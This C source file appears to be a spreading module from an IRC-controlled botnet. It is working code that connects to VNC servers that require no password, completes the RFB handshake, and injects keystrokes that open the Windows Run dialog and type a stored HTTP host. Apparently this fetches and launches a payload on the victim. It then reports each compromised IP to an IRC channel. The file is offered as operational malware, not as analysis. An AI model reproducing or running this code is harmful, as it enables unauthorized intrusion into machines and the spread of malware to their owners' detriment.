#include "../h/includes.h"
#include "../h/functions.h"
#include "../h/externs.h"

#define MAX_SEND 8
#define MAX_RECV 64

#ifndef NO_VNC

char szHTTPHost[256] = {0};

void sethttp(char *szHost)
{
   memset(szHTTPHost, 0, sizeof(szHTTPHost));
   _snprintf(szHTTPHost, sizeof(szHTTPHost) - 1, "%s", szHost);
}

void send_key(SOCKET SOCK, char *szKey, DWORD dwKeyState = 0)
{
   char szVNCSendKey[] = "\x04",
       szKeyDown[] = "\x01",
       szKeyUp[] = "\x00",
       szNullBytes_1[] = "\x00\x00\x00\x00",
       szNullBytes_2[] = "\x00\x00\x00\x00\x00";

   //Can't use _snprintf to just send one bit of data because of null bytes
   if (dwKeyState == 0)
   {
      for (int i = 0; i <= 1; i++)
      {
         switch (i)
         {
         case 0:
            fsend(SOCK, szVNCSendKey, 1, 0);
            fsend(SOCK, szKeyDown, 1, 0);

            if (strlen(szKey) == 2)
               fsend(SOCK, szNullBytes_1, 4, 0);
            else
               fsend(SOCK, szNullBytes_2, 5, 0);

            fsend(SOCK, szKey, strlen(szKey), 0);

            break;
         case 1:
            fsend(SOCK, szVNCSendKey, 1, 0);
            fsend(SOCK, szKeyUp, 1, 0);

            if (strlen(szKey) == 2)
               fsend(SOCK, szNullBytes_1, 4, 0);
            else
               fsend(SOCK, szNullBytes_2, 5, 0);
   
            fsend(SOCK, szKey, strlen(szKey), 0);

            break;
         }
      }
   }
   else {
      switch (dwKeyState)
      {
      case 1:
         fsend(SOCK, szVNCSendKey, 1, 0);
         fsend(SOCK, szKeyDown, 1, 0);

         if (strlen(szKey) == 2)
            fsend(SOCK, szNullBytes_1, 4, 0);
         else
            fsend(SOCK, szNullBytes_2, 5, 0);

         fsend(SOCK, szKey, strlen(szKey), 0);

         break;
      case 2:
         fsend(SOCK, szVNCSendKey, 1, 0);
         fsend(SOCK, szKeyUp, 1, 0);

         if (strlen(szKey) == 2)
            fsend(SOCK, szNullBytes_1, 4, 0);
         else
            fsend(SOCK, szNullBytes_2, 5, 0);
   
         fsend(SOCK, szKey, strlen(szKey), 0);

         break;
      }
   }
}

BOOL VNCExploit(EXINFO exinfo)
{
   struct sockaddr_in sock;
   SOCKET sVNC;

   char szBuffer[IRCLINE],
       szReceiveBuffer[MAX_RECV],
       szChar[4],
       szVersionPacket[] = "\x52\x46\x42\x20\x30\x30\x33\x2E\x30\x30\x38\x0A",
       szServerPacket_1[] = "\x01\x02",
       szServerPacket_2[] = "\x00\x00\x00\x00",
       szClientPacket_1[] = "\x01",
       szClientPacket_2[] = "\x01",
       szKeyWindows[] = "\xFF\xEB",
       szKeyArrowLeft[] = "\xFF\x51",
       szKeyEnter[] = "\xFF\x0D",
       szKeyR[] = "\x72";

   int iRecvBytes = 0, iAction = 0;
   unsigned int i = 0;

   if ((sVNC = fsocket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
   {
      fclosesocket(sVNC);
   }

   sock.sin_family = AF_INET;
   sock.sin_addr.s_addr = finet_addr(exinfo.ip);
   sock.sin_port = fhtons((unsigned short)exinfo.port);

   if ((fconnect(sVNC, (struct sockaddr *)&sock, sizeof(sock))))
   {
      fclosesocket(sVNC);
      return (false);
   }

   while (true)
   {
      memset(szReceiveBuffer, 0, sizeof(szReceiveBuffer));
      iRecvBytes = frecv(sVNC, szReceiveBuffer, MAX_RECV, 0);
      if (iRecvBytes <= 0 || iRecvBytes == SOCKET_ERROR)
      {
         break;
      }
      else
      {
         switch (iAction)
         {
         case 0:
            if (!strcmp(szReceiveBuffer, szVersionPacket))
            {
               fsend(sVNC, szVersionPacket, strlen(szVersionPacket), 0);
               iAction++;
            }
            else
            {
               fclosesocket(sVNC);
               return (false);
            }

            break;
         case 1:
            if (!strcmp(szReceiveBuffer, szServerPacket_1))
            {
               fsend(sVNC, szClientPacket_1, strlen(szClientPacket_1), 0);
               iAction++;
            }
            else
            {
               fclosesocket(sVNC);
               return (false);
            }

            break;
         case 2:
            if (!strcmp(szReceiveBuffer, szServerPacket_2))
            {
               iAction++;
               break;
            }
            else
            {
               fclosesocket(sVNC);
               return (false);
            }
         }

         if (iAction == 3) { break; }
      }
   }

   fsend(sVNC, szClientPacket_2, 1, 0);

   send_key(sVNC, szKeyWindows, 1);
   Sleep(1000);

   send_key(sVNC, szKeyR);
   Sleep(1000);

   send_key(sVNC, szKeyWindows, 2);
   Sleep(1000);

   for (i = 0; i < strlen(szHTTPHost); i++)
   {
      _snprintf(szChar, sizeof(szChar) - 1, "%c", szHTTPHost[i]);
      send_key(sVNC, szChar);
      Sleep(125);
   }

   send_key(sVNC, szKeyEnter);
   Sleep(4000);

   for (i = 0; i <= 1; i++)
   {
      send_key(sVNC, szKeyArrowLeft);
      Sleep(300);
   }

   Sleep(2000);
   send_key(sVNC, szKeyEnter);

   Sleep(2000);
   send_key(sVNC, szKeyArrowLeft);
   Sleep(400);

   for (i = 0; i <= 1; i++)
   {
      Sleep(600);
      send_key(sVNC, szKeyEnter);
   }

   fclosesocket(sVNC);

   _snprintf(szBuffer, sizeof(szBuffer) - 1, "[%s]: Exploiting IP: %s.", exploit[exinfo.exploit].name, exinfo.ip);
   irc_privmsg(exinfo.sock, exinfo.chan, szBuffer, exinfo.notice);
   exploit[exinfo.exploit].stats++;

   return (true);
}
#endif